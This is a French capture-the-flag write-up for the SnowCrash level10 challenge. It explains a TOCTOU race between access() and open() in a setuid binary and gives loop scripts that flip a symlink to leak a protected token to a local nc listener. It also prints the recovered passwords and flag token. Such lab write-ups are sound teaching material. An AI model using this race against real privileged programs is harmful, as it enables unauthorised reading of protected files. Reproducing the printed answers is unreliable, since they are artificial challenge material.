# README - Exploitation du binaire level10

## Étapes suivies pour obtenir le Flag10

### 1. Identification des fichiers

Le répertoire contient deux fichiers principaux :

```bash
level10@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag10 level10 8672 Mar  5  2016 level10
----r--r-- 1 flag10 level10   32 Mar  5  2016 token
```

- **`level10`** : Un exécutable avec les permissions `setuid` et `setgid`, s'exécutant avec les privilèges de l'utilisateur `flag10`.
- **`token`** : Un fichier contenant le mot de passe chiffré pour `flag10`, inaccessible directement en lecture par `level10`.

### 2. Analyse du programme `level10`

En exécutant le programme avec `ltrace ./level10 token 127.0.0.1`, on observe :

- Le binaire utilise `access()` pour vérifier les permissions de lecture sur le fichier passé en argument.
- Il ouvre ensuite le fichier avec `open()` et envoie son contenu via une connexion TCP sur le port 6969.
- Une vulnérabilité TOCTOU (Time-Of-Check-To-Time-Of-Use) existe : un délai entre la vérification des droits et l'ouverture permet de manipuler le fichier.

### 3. Exploitation de la race condition

La stratégie consiste à utiliser un lien symbolique modifié en temps réel pour tromper le binaire :
- Créer un fichier lisible (`/tmp/stuff`) comme leurre.
- Alterner un lien symbolique (`/tmp/link`) entre `/tmp/stuff` et `/home/user/level10/token` pour exploiter le délai entre `access()` et `open()`.

### 4. Mise en œuvre avec des scripts

Deux scripts ont été utilisés pour automatiser l'exploitation.

#### Script `/tmp/link.sh` :
```bash
#!/bin/bash
while true; do
    ln -sf /tmp/stuff /tmp/link
    rm -f /tmp/link
    ln -sf /home/user/level10/token /tmp/link
    rm -f /tmp/link
done
```

#### Script `/tmp/run.sh` :
```bash
#!/bin/bash
while true; do
    /home/user/level10/level10 /tmp/link 127.0.0.1
done
```

#### Étape 1 : Préparation
- Créer le fichier leurre : `echo "test" > /tmp/stuff` et `chmod 644 /tmp/stuff`.
- Lancer `/tmp/link.sh` dans un terminal pour alterner le lien.
- Lancer `nc -lk 0.0.0.0 6969` dans un autre terminal pour écouter les données.

#### Étape 2 : Exécution
- Lancer `/tmp/run.sh` dans un troisième terminal.
- Sur `nc`, récupérer le contenu du `token` (ex. : `woupa2yuojeeaaed06riuj63c`) après plusieurs essais.

### 5. Passage à l'utilisateur suivant

Utiliser le mot de passe récupéré pour passer à `flag10` :

```bash
level10@SnowCrash:~$ su flag10
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

### 6. Accès à l'utilisateur suivant

Utiliser le token pour passer à `level11` :

```bash
flag10@SnowCrash:~$ su level11
Password: feulo4b72j7edeahuete3no7c
level11@SnowCrash:~$
```

### Vulnérabilité expliquée

Le programme `level10` souffre d'une vulnérabilité TOCTOU. Il vérifie les permissions avec `access()` mais ouvre le fichier plus tard avec `open()`. En modifiant rapidement un lien symbolique entre un fichier lisible et le `token` pendant ce délai, on force le binaire à envoyer le contenu du `token`, malgré ses restrictions d'accès. Cette exploitation nécessite une synchronisation précise et ne repose pas sur du brute force, mais sur une manipulation logique du système de fichiers.